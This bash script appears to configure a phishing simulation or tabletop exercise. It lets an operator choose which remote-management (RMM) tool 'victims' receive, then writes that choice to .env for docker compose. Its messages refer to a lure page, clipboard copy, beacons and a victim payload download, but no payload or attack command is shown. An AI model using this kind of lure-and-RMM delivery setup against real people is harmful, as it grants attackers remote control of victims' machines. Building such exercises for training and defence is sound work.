#!/bin/bash
# setup.sh - one-time interactive setup: pick which RMM tool victims receive.
#
# Scans ttx/rmm/*/manifest, shows a numbered menu, and writes the choice to
# .env. docker compose reads .env automatically (RMM_TOOL), so the whole flow
# is:
#
#     ./setup.sh && docker compose up -d --build
#
set -e
cd "$(dirname "$0")"

RMM_DIR="ttx/rmm"
ENV_FILE=".env"

# ---- discover available tool modules --------------------------------------
declare -a IDS NAMES FILES NOTES
while IFS= read -r m; do
  TOOL_ID=""; DISPLAY_NAME=""; PAYLOAD_FILE=""; README=""
  # shellcheck disable=SC1090
  . "$m"
  [ -n "$TOOL_ID" ] || { echo "ERROR: $m has no TOOL_ID"; exit 1; }
  IDS+=("$TOOL_ID"); NAMES+=("$DISPLAY_NAME"); FILES+=("$PAYLOAD_FILE"); NOTES+=("$README")
done < <(find "$RMM_DIR" -mindepth 2 -maxdepth 2 -name manifest | sort)

[ "${#IDS[@]}" -gt 0 ] || { echo "ERROR: no tool manifests found under $RMM_DIR/*/manifest"; exit 1; }

# ---- menu ----------------------------------------------------------------
N=${#IDS[@]}
echo "Which RMM tool should victims receive?"
echo
for i in $(seq 0 $((N-1))); do
  if [ -n "${FILES[$i]}" ] && [ -f "$RMM_DIR/${IDS[$i]}/${FILES[$i]}" ]; then
    status="payload OK"
  else
    status="PAYLOAD MISSING"
  fi
  printf '  %d) %-40s [%s]\n' $((i+1)) "${NAMES[$i]}" "$status"
done
echo

# Default selection = current .env value, if valid
DEFAULT_NUM=""
if [ -n "${RMM_TOOL:-}" ]; then
  for i in "${!IDS[@]}"; do
    if [ "${IDS[$i]}" = "${RMM_TOOL}" ]; then DEFAULT_NUM=$((i+1)); fi
  done
fi

while true; do
  if [ -n "$DEFAULT_NUM" ]; then
    read -rp "Selection (1-$N) [default: $DEFAULT_NUM]: " sel
    [ -z "$sel" ] && sel=$DEFAULT_NUM
  else
    read -rp "Selection (1-$N): " sel
  fi
  if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -ge 1 ] && [ "$sel" -le "$N" ]; then break; fi
  echo "Please enter a number between 1 and $N."
done

idx=$((sel-1))
TOOL="${IDS[$idx]}"
DIR="$RMM_DIR/$TOOL"
PAYLOAD="${FILES[$idx]}"

echo
echo "Selected: $TOOL - ${NAMES[$idx]}"
if [ ! -f "$DIR/$PAYLOAD" ]; then
  echo
  echo "WARNING: payload file '$DIR/$PAYLOAD' is not in place yet."
  echo "  ${NOTES[$idx]}"
  echo "  You can still launch (lure page, clipboard copy and beacons work),"
  echo "  but the victim flow will fail at the payload download step."
fi

echo "RMM_TOOL=$TOOL" > "$ENV_FILE"
echo
echo "Wrote $ENV_FILE. Launch with:"
echo "    docker compose up -d --build"
echo
echo "To switch tools later: re-run ./setup.sh, then"
echo "    docker compose down && docker compose up -d --build"
